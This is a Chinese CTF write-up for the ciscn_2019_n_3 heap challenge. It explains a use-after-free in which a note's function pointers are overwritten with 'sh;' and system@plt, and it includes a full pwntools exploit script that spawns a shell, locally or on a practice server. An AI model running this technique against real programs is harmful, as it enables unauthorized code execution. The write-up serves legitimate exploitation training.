# ciscn_2019_n_3

## 来源
ciscn


## 难度

2 / 10

## 保护

 ```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
 ```

## 简单描述

程序给了system,所以直接不用获取libc地址, 而且采用函数指针进行功能的管理.

## vul

```c
// 释放功能中
int __cdecl rec_str_free(void *ptr)
{
  free(*((void **)ptr + 2)); // vul
  free(ptr); // vul
  return puts("Note freed!");
}
//添加功能中
... ...
if ( size > 0x400 ) //是先开辟0xc的头部管理内存, 若内容大于0x400后, 就直接退出了.
      return puts("Length too long, please buy pro edition to store longer note!");

int do_del()
{
  int v0; // eax

  v0 = ask((int)"Index");
  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]); //使用函数指针调用
}
```



## 知识点

堆布局

## 思路

通过uaf漏洞和0x400来控制管理头部的内存.通过调试.该管理头部的内存中储存函数指针.如下:

```
  0x9f70158 FASTBIN {
  mchunk_prev_size = 0,
  mchunk_size = 17,
  fd = 0x80486be <rec_int_print>, //储存的是打印函数的指针
  bk = 0x80486fe <rec_int_free>, //储存的是释放函数的指针
  fd_nextsize = 0x0,
  bk_nextsize = 0x11
}

```

通过调试发现,在调用释放指针的时候, 直接将当前堆区数据的地址进行参数传入.所以直接将, fd改为 /bin/sh\x00,bk改为system的plt就行.然后释放即可getshell

```c
return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]); //使用函数指针调用
```

## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './ciscn_2019_n_3'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 25861

LOCAL = 1
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def adt(idx, size, data):
	sla('CNote > ', str(1))
	sla('Index > ', str(idx))
	sla('Type > ', str(2))
	sla('Length > ', str(size))
	if(size > 0x400):
		return
	sa('Value > ', data)

def rm(idx):
	sla('CNote > ', str(2))
	sla('Index > ', str(idx))

def dp(idx):
	sla('CNote > ', str(3))
	sla('Index > ', str(idx))

def q():
	sla('CNote > ', str(5))	

#--------------------------Exploit--------------------------
def exploit():

	adt(0, 0x401, '\n')
	adt(1, 0x401, '\n')

	rm(0)
	rm(1)

	db()
	p = 'sh;\x00' #as a system perm
	p += p32(exe.plt['system']) #free

	adt(4, 0x9, p)
	rm(0) #再次释放, 即可调用system

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

